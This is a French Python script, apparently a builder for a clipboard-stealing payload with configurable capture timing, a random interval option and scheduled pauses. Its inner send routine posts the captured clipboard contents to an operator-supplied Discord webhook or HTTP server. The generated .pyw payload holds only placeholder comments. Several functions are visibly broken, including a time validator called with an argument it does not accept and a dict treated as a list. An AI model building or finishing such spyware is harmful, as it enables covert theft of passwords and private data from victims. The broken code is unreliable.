import os
from colorama import Fore, Style
import time
import random

def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Clipboard ===\n\n")
    print("""
          
          Options : 

    1. Intervalle de capture (en secondes) 'random' pour un temps entre 1 et 10 secondes
    2. Type de données à capturer (texte, images, etc.)
    3. Taile maximale du clipboard à capturer en Mo
    4. Limite de débit envois/minute
    5. Seuil de longueur du texte à capturer
    6. Heure de début de capture (HH:MM)
    7. Heure de fin de capture (HH:MM)
    8. Début Pause de capture (HH:MM)
    9. Fin Pause de capture (HH:MM)
    10. Sauvegarde locale
        
         
          Sortie et envoi:

    11. Envoi sur discord
    12. Envoi par email
    13. Envoi sur serveur HTTP
                      
 Tapez: set <num> pour configurer une option, ou exit pour quitter. 
 Tapez: show pour afficher la configuration actuelle.
 Tapez: create pour créer le payload avec la configuration actuelle.
                 
          """)

def clipboard_module():
    clear()
    print("=== Clipboard Configuration ===\n\n")
    choix = {}            

    def intervalle_capture():
            clear()
            print("Définir l'intervalle de capture en secondes.\n\n")
            intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
            try:
                if intervalle.lower() == 'random':
                    intervalle = random.randint(1, 10)
                    print(f"Intervalle défini sur {intervalle} secondes.")
                    time.sleep(2)
                    choix["Intervalle de capture"] = intervalle
                else:
                    choix["Intervalle de capture"] = intervalle
                    print(f"Intervalle défini sur {intervalle} secondes.")
                    time.sleep(2)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
                time.sleep(2)

    def type_donnees():  
        clear()
        data_type = input("Définir le type de données à capturer (texte, images) : ")
        choix["Type de données à capturer"] = data_type
        print(f"Type de données à capturer défini sur {data_type}.")
        time.sleep(2)  


    def taille_maximale():
        clear()
        try:
            taille = int(input("Définir la taille maximale du clipboard à capturer en Mo : "))
            choix["Taille maximale du clipboard (Mo)"] = taille
            print(f"Taille maximale définie sur {taille} Mo.")
            time.sleep(2)
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
            time.sleep(2)

    def limite_debit():
        clear()
        limite = int(input("Définir la limite de débit en envois/minute : "))
        choix["Limite de débit (envois/minute)"] = limite
        print(f"Limite de débit définie sur {limite} envois/minute.")
        time.sleep(2)

    def seuil_longueur():
        clear()
        long = int(input("Définir le seuil de longueur maximum du texte à capturer : "))
        choix["Seuil de longueur du texte"] = long
        print(f"Seuil de longueur défini sur {long}.")
        time.sleep(2)

    def valide_heure():
        try:
            time.strptime("%H:%M")
            return True
        except ValueError:
            return False

    def heure_debut():
        clear()
        heure_debut = input("HH:MM de début : ")
        if not valide_heure(heure_debut):
            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
            time.sleep(2)
            return
        choix["Heure de début de capture"] = heure_debut
        print(f"Heure de début de capture définie sur {heure_debut}.")
        time.sleep(2)
     
    def heure_fin():
        clear()
        heure_fin = input("HH:MM de fin : ")
        if not valide_heure(heure_fin):
            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
            time.sleep(2)
            return
        choix["Heure de fin de capture"] = heure_fin
        print(f"Heure de fin de capture définie sur {heure_fin}.")
        time.sleep(2)

    def debut_pause():
        clear()
        heure_debut_pause = input("Définir l'heure de début de la pause de capture (HH:MM) : ")
        if not valide_heure(heure_debut_pause):
            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
            time.sleep(2)
            return
        choix["Début Pause de capture"] = heure_debut_pause
        print(f"Heure de début de la pause de capture définie sur {heure_debut_pause}.")
        time.sleep(2)

    def fin_pause():
        clear()
        heure_fin_pause = input("Définir l'heure de fin de la pause de capture (HH:MM) : ")
        if not valide_heure(heure_fin_pause):
            print(Fore.RED + "Format invalide (HH:MM)" + Style.RESET_ALL)
            time.sleep(2)
            return
        choix["Fin Pause de capture"] = heure_fin_pause
        print(f"Heure de fin de la pause de capture définie sur {heure_fin_pause}.")
        time.sleep(2)

    def sauvegarde_locale():
        clear()
        reponse = input("Activer la sauvegarde locale ? (yes/no) : ")
        choix["Sauvegarde locale"] = (reponse.lower() == "yes")
        print(f"Sauvegarde locale {'activée' if reponse.lower() == 'yes' else 'désactivée'}.")
        time.sleep(2)

    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook discord : ")
        choix["Envoi sur Discord"] = webhook
        time.sleep(2)

    def envoi_email():
        clear()
        reponse = input("Activer l'envoi par email ? (yes/no) : ")
        choix.append(("Envoi par email", reponse.lower() == 'yes'))
        print(f"Envoi par email {'activé' if reponse.lower() == 'yes' else 'désactivé'}.")
        time.sleep(2)

    def envoi_http():
        clear()
        reponse = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = reponse
        time.sleep(2)



    import clipboard
    import requests

    def clipboard_option_func():

        old = clipboard.paste()

        def envoyer():
            if "Envoi sur Discord" in choix:
                webhook_url = choix["Envoi sur Discord"]
                data = {"content": old}
                try:
                    response = requests.post(webhook_url, json=data)
                    if response.status_code == 204:
                        print("Données envoyées sur Discord avec succès.")
                    else:
                        print(f"Échec de l'envoi sur Discord. Statut : {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erreur lors de l'envoi sur Discord : {e}")
            if "Envoi sur serveur HTTP" in choix:
                server_url = choix["Envoi sur serveur HTTP"]
                data = {"clipboard_data": old}
                try:
                    response = requests.post(server_url, json=data)
                    if response.status_code == 200:
                        print("Données envoyées sur le serveur HTTP avec succès.")
                    else:
                        print(f"Échec de l'envoi sur le serveur HTTP. Statut : {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erreur lors de l'envoi sur le serveur HTTP : {e}")
            
        





    options = [
        ("Intervalle de capture (en secondes)", intervalle_capture),
        ("Type de données à capturer (texte, images, etc.)" , type_donnees),
        ("Taile maximale du clipboard à capturer en Mo" , taille_maximale),
        ("Limite de débit envois/minute" , limite_debit),
        ("Seuil de longueur du texte à capturer" , seuil_longueur),
        ("Heure de début de capture (HH:MM)" , heure_debut),
        ("Heure de fin de capture (HH:MM)" , heure_fin),
        ("Début Pause de capture (HH:MM)" , debut_pause),
        ("Fin Pause de capture (HH:MM)" , fin_pause),
        ("Sauvegarde locale " , sauvegarde_locale),
        ("Envoi sur discord" , envoi_discord),
        ("Envoi par email" , envoi_email),
        ("Envoi sur serveur HTTP" , envoi_http),
    ]

    def create_payload():
        with open("Option/modules/payload/payload_created/clipboard_payload.pyw", "w") as f:
            for option, value in choix.items():
                f.write(f"# {option} : {value}\n")
            f.write("\n# Code du payload ici...\n")

    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()  # Appelle la fonction associée à l'option
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            print("\nConfiguration actuelle du module Clipboard :")
            for option, value in choix.items():
                print(f"{option} : {value}")
            input("\nAppuyez sur Entrée pour continuer...")

        if cmd.lower() == "create":
            create_payload()
        


clipboard_module()
